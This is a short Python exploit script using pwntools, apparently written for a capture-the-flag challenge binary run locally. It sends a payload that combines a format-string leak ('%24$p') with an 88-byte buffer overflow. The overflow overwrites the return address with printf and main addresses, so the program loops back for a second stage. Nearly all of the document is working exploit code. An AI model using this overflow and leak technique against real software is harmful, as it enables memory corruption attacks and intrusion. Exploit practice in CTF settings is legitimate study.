#!/usr/bin/env python3
import os,time
os.environ["TERM"]="xterm"
from pwn import *
context.log_level="error"
PRINTF=0x4010d4; MAIN=0x4012a2
# Try: printf at buf+88, main at buf+96. See if after leak it loops (prints banner/>> again).
p=process("/work/waf/waf/chal_remote")
p.recvuntil(b">> ")
pay=(b"exit"+b"{%24$p}").ljust(88,b"A")+p64(PRINTF)+p64(MAIN)
p.send(pay); time.sleep(0.3)
out=p.recv(timeout=1)
print("stage1:",out[:150])
if b">> " in out or b"Look ma" in out:
    print(">>> LOOPED! can do stage2")
    p.send((b"exit").ljust(88,b"A")+p64(MAIN))
    time.sleep(0.2)
    print("stage2:", p.recv(timeout=1)[:80])
p.close()
